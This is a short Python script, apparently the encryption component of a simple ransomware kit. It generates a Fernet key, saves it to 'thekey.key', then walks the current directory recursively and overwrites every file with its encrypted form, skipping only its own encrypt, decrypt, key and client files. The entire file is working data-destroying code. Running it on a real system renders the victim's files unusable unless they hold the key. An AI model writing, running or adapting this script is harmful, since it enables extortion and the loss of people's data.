import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def encrypt_files_in_directory(directory_path, key):
    files_encrypted = 0
    for dirpath, _, filenames in os.walk(directory_path):
        for filename in filenames:
            if filename not in ['encrypt.py', 'thekey.key', 'decrypt.py', 'client.py']:
                file_path = os.path.join(dirpath, filename)
                encrypt_file(file_path, key)
                files_encrypted += 1
    return files_encrypted

def generate_and_save_key(key_path):
    key = Fernet.generate_key()
    with open(key_path, "wb") as key_file:
        key_file.write(key)
    return key

base_dir = '.'

key_path = "thekey.key"
key = generate_and_save_key(key_path)
# print(f"Chave gerada e salva em {key_path}")

files_encrypted = encrypt_files_in_directory(base_dir, key)
# print(f"Total de arquivos encriptados: {files_encrypted}")
